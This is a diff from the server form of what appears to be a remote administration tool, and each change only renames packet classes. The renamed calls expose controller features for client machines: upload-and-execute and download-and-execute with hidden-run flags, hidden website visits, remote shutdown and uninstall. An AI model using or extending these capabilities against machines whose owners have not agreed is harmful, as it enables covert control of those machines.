@@ -157,7 +157,7 @@ namespace xServer.Forms
 
         private void ClientConnected(Client client)
         {
-            new Core.Packets.ServerPackets.InitializeCommand().Execute(client);
+            new Core.Packets.ServerPackets.GetAuthentication().Execute(client);
         }
 
         private void ClientDisconnected(Client client)
@@ -392,7 +392,7 @@ namespace xServer.Forms
                         {
                             foreach (Client c in GetSelectedClients())
                             {
-                                new Core.Packets.ServerPackets.Update(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
+                                new Core.Packets.ServerPackets.DoClientUpdate(0, Core.Misc.Update.DownloadURL, string.Empty, new byte[0x00], 0, 0).Execute(c);
                             }
                         }
                         else
@@ -417,8 +417,8 @@ namespace xServer.Forms
 
                                     int ID = new Random().Next(0, int.MaxValue);
 
-                                    CommandHandler.HandleStatus(c,
-                                        new Core.Packets.ClientPackets.Status("Uploading file..."));
+                                    CommandHandler.HandleSetStatus(c,
+                                        new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
 
                                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                     {
@@ -430,7 +430,7 @@ namespace xServer.Forms
                                             error = true;
                                             break;
                                         }
-                                        new Core.Packets.ServerPackets.Update(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
+                                        new Core.Packets.ServerPackets.DoClientUpdate(ID, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                     }
                                 }
                             }).Start();
@@ -444,7 +444,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Disconnect().Execute(c);
+                new Core.Packets.ServerPackets.DoClientDisconnect().Execute(c);
             }
         }
 
@@ -452,7 +452,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Reconnect().Execute(c);
+                new Core.Packets.ServerPackets.DoClientReconnect().Execute(c);
             }
         }
 
@@ -468,7 +468,7 @@ namespace xServer.Forms
             {
                 foreach (Client c in GetSelectedClients())
                 {
-                    new Core.Packets.ServerPackets.Uninstall().Execute(c);
+                    new Core.Packets.ServerPackets.DoClientUninstall().Execute(c);
                 }
             }
         }
@@ -571,7 +571,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Action(0).Execute(c);
+                new Core.Packets.ServerPackets.DoShutdownAction(0).Execute(c);
             }
         }
 
@@ -579,7 +579,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Action(1).Execute(c);
+                new Core.Packets.ServerPackets.DoShutdownAction(1).Execute(c);
             }
         }
 
@@ -587,7 +587,7 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                new Core.Packets.ServerPackets.Action(2).Execute(c);
+                new Core.Packets.ServerPackets.DoShutdownAction(2).Execute(c);
             }
         }
 
@@ -659,8 +659,8 @@ namespace xServer.Forms
 
                                 int ID = new Random().Next(0, int.MaxValue);
 
-                                CommandHandler.HandleStatus(c,
-                                    new Core.Packets.ClientPackets.Status("Uploading file..."));
+                                CommandHandler.HandleSetStatus(c,
+                                    new Core.Packets.ClientPackets.SetStatus("Uploading file..."));
 
                                 for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                 {
@@ -672,7 +672,7 @@ namespace xServer.Forms
                                         error = true;
                                         break;
                                     }
-                                    new Core.Packets.ServerPackets.UploadAndExecute(ID,
+                                    new Core.Packets.ServerPackets.DoUploadAndExecute(ID,
                                         Path.GetFileName(UploadAndExecute.FilePath), block, srcFile.MaxBlocks,
                                         currentBlock, UploadAndExecute.RunHidden).Execute(c);
                                 }
@@ -693,7 +693,7 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL,
+                            new Core.Packets.ServerPackets.DoDownloadAndExecute(DownloadAndExecute.URL,
                                 DownloadAndExecute.RunHidden).Execute(c);
                         }
                     }
@@ -711,7 +711,7 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
+                            new Core.Packets.ServerPackets.DoVisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                         }
                     }
                 }
@@ -728,7 +728,7 @@ namespace xServer.Forms
                     {
                         foreach (Client c in GetSelectedClients())
                         {
-                            new Core.Packets.ServerPackets.ShowMessageBox(
+                            new Core.Packets.ServerPackets.DoShowMessageBox(
                                 MessageBoxData.Caption, MessageBoxData.Text, MessageBoxData.Button, MessageBoxData.Icon).Execute(c);
                         }
                     }
